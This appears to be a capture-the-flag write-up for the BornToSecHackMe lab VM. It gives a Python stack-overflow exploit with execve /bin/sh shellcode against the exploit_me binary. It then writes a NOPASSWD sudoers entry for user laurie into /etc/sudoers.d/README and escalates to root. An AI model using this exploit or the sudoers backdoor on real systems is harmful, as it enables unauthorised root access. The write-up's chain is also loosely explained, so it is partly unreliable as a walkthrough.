### Writeup 6 

> Grant access to laurie without being root

For this exploit, we will use the `exploit_me` binary that is present on the user zaz's home directory. We will make it segfault, add a shellcode and overwrite the return address to point to the shellcode.

```py 
import struct
pad = "\x41" * 140
EIP = struct.pack("I", 0xbffff6A0)
NOP = "\x90" * 100
shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
print(pad + EIP + NOP + shellcode)
```

After that, we will write in the /etc/sudoers.d/README to add the line `laurie ALL=(ALL) NOPASSWD: ALL` to grant access to laurie without being root.

```bash
zaz@BornToSecHackMe:~$ echo "laurie ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/README
```

Now, we can connect as laurie and add ourselves to the root group.

```bash
ssh laurie@192.168.56.101
laurie@BornToSecHackMe:~$ sudo adduser laurie root
```

```bash
laurie@BornToSecHackMe:~$ sudo id
uid=0(root) gid=0(root) groups=0(root)
```
